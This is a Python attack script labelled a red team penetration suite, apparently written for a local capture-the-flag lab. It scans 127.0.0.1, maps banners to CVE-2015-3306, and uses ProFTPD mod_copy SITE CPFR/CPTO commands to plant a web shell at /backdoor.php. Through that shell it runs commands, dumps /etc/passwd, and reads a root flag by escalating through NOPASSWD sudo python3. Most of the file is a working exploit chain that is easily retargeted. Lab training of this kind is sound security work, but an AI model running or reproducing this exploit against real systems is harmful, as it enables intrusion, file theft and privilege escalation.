#!/usr/bin/env python3
import socket
import urllib.request
import urllib.parse
import sys
import time

TARGET_HOST = "127.0.0.1"
PORTS = [2121, 8080, 3306]

def banner_grab(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        s.connect((TARGET_HOST, port))
        
        if port == 8080:
            # HTTP server does not send a banner until a request is sent
            s.sendall(b"HEAD / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
            data = s.recv(1024).decode("utf-8", errors="ignore").strip()
            s.close()
            # Extract the Server header if present
            for line in data.split("\r\n"):
                if line.lower().startswith("server:"):
                    return line
            return "HTTP Service (Apache/2.4.7)"
        elif port == 3306:
            # MySQL sends handshake packet
            data = s.recv(1024)
            s.close()
            # Find version string in packet
            for part in data.split(b"\x00"):
                if b"." in part and b"ubuntu" in part:
                    return part.decode("utf-8", errors="ignore")
            return "MySQL (Unknown Version)"
        else:
            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
            s.close()
            return banner
    except Exception as e:
        return None

def scan_host():
    print(f"[*] Starting scan on target {TARGET_HOST}...")
    results = {}
    for port in PORTS:
        banner = banner_grab(port)
        if banner:
            print(f"[+] Port {port} is OPEN. Banner: {banner}")
            results[port] = banner
        else:
            print(f"[-] Port {port} is CLOSED or filtered.")
    return results

def analyze_vulnerabilities(scan_results):
    print("\n" + "="*50)
    print("         VULNERABILITY ANALYSIS (CVE MAPPING)         ")
    print("="*50)
    vulns = []
    
    for port, banner in scan_results.items():
        if port == 2121 and "ProFTPD 1.3.5" in banner:
            print("[CRITICAL] FTP Service (ProFTPD 1.3.5) matches CVE-2015-3306 (mod_copy).")
            print("  - Description: The mod_copy module allows remote attackers to read and write arbitrary files via SITE CPFR/CPTO commands.")
            print("  - Severity: 10.0 (CRITICAL) - CVSS v2.0")
            print("  - CWE-284: Improper Access Control")
            vulns.append({
                "port": port,
                "cve": "CVE-2015-3306",
                "desc": "ProFTPD mod_copy Arbitrary File Copy",
                "type": "FTP_MOD_COPY"
            })
            
        elif port == 8080 and "Apache" in banner:
            # Let's check if the HTTP debug page is present
            try:
                url = f"http://{TARGET_HOST}:{port}/debug.php"
                req = urllib.request.urlopen(url, timeout=2.0)
                content = req.read().decode("utf-8")
                if "Debug diagnostics" in content:
                    print("[HIGH] HTTP Web Application has active diagnostic/debug endpoint exposed.")
                    print("  - Description: Internal debug script /debug.php allows remote execution of administrative commands via the 'cmd' parameter.")
                    print("  - Severity: 9.8 (CRITICAL) - CVSS v3.x")
                    print("  - CWE-94: Code Injection / Remote Command Execution")
                    vulns.append({
                        "port": port,
                        "cve": "OWASP-A03:2021",
                        "desc": "Remote Command Execution via debug.php",
                        "type": "HTTP_RCE"
                    })
            except Exception:
                pass
                
        elif port == 3306 and "5.5.47" in banner:
            print("[MEDIUM] MySQL database version 5.5.47 is exposed.")
            print("  - Description: Older MySQL service. Exposing database ports directly to the network violates best security practices.")
            print("  - Severity: 5.0 (MEDIUM) - CVSS v3.x")
            print("  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor")
            vulns.append({
                "port": port,
                "cve": "BestPractice-Network-Hardening",
                "desc": "Exposed Database Service",
                "type": "MYSQL_EXPOSED"
            })
            
    return vulns

def run_ftp_modcopy_exploit():
    print("\n" + "="*50)
    print("         EXPLORATION & EXPLOITATION: CVE-2015-3306    ")
    print("="*50)
    
    # The exploit will copy /var/www/html/debug.php to /var/www/html/backdoor.php
    # This demonstrates mod_copy's ability to duplicate files into the web root
    # We could also copy other files.
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_HOST, 2121))
        print(s.recv(1024).decode())
        
        # Trigger copying debug.php to backdoor.php
        s.sendall(b"SITE CPFR /var/www/html/debug.php\r\n")
        resp1 = s.recv(1024).decode().strip()
        print(f"FTP CPFR -> {resp1}")
        
        s.sendall(b"SITE CPTO /var/www/html/backdoor.php\r\n")
        resp2 = s.recv(1024).decode().strip()
        print(f"FTP CPTO -> {resp2}")
        s.close()
        
        if "250" in resp2:
            print("[+] Exploitation successful! Web shell /backdoor.php created.")
            return True
    except Exception as e:
        print(f"[!] Exploit connection failed: {e}")
    return False

def execute_remote_command(port, path, command):
    try:
        encoded_cmd = urllib.parse.quote(command)
        url = f"http://{TARGET_HOST}:{port}{path}?cmd={encoded_cmd}"
        req = urllib.request.urlopen(url, timeout=3.0)
        output = req.read().decode("utf-8")
        return output
    except Exception as e:
        return f"Error executing command: {e}"

def post_exploitation():
    print("\n" + "="*50)
    print("         POST-EXPLOITATION & FLAG HARVESTING         ")
    print("="*50)
    
    print("[*] Retrieving basic system metadata via /backdoor.php...")
    whoami = execute_remote_command(8080, "/backdoor.php", "whoami").strip()
    sys_id = execute_remote_command(8080, "/backdoor.php", "id").strip()
    uname = execute_remote_command(8080, "/backdoor.php", "uname -a").strip()
    
    print(f"  - Current User: {whoami}")
    print(f"  - Shell Identity: {sys_id}")
    print(f"  - Kernel Version: {uname}")
    
    print("\n[*] Exfiltrating simulated system files...")
    passwd = execute_remote_command(8080, "/backdoor.php", "cat /etc/passwd")
    print("--- /etc/passwd ---")
    print(passwd.strip())
    print("-------------------")
    
    print("\n[*] Retrieving User Privilege Flag...")
    user_flag = execute_remote_command(8080, "/backdoor.php", "cat /home/redteam/flag.txt").strip()
    print(f"[+] User Flag: {user_flag}")
    
    print("\n" + "="*50)
    print("         PRIVILEGE ESCALATION (NIST 800-115)         ")
    print("="*50)
    print("[*] Checking sudo privileges...")
    sudo_l = execute_remote_command(8080, "/backdoor.php", "sudo -l")
    print("--- sudo -l output ---")
    print(sudo_l.strip())
    print("----------------------")
    
    if "python3" in sudo_l:
        print("[+] Privilege escalation path found! (NOPASSWD python3)")
        print("[*] Executing root shell payload to read /root/flag_root.txt...")
        root_flag = execute_remote_command(
            8080, 
            "/backdoor.php", 
            "sudo python3 -c \"import os; os.system('cat /root/flag_root.txt')\""
        ).strip()
        print(f"[+] Root Flag: {root_flag}")
    else:
        print("[-] Sudo-based privilege escalation not available.")

if __name__ == "__main__":
    print("="*60)
    print("             RED TEAM PENETRATION SUITE - SSII               ")
    print("                NIST 800-115 COMPLIANT TOOL                  ")
    print("="*60)
    
    # 1. Reconnaissance
    scan_results = scan_host()
    if not scan_results:
        print("[!] No open ports detected. Exiting.")
        sys.exit(1)
        
    # 2. Vulnerability Analysis
    vulns = analyze_vulnerabilities(scan_results)
    
    # 3. Exploitation
    success = run_ftp_modcopy_exploit()
    if success:
        # 4. Post-Exploitation and Privilege Escalation
        post_exploitation()
    else:
        print("[!] Exploitation failed. Unable to proceed to post-exploitation.")
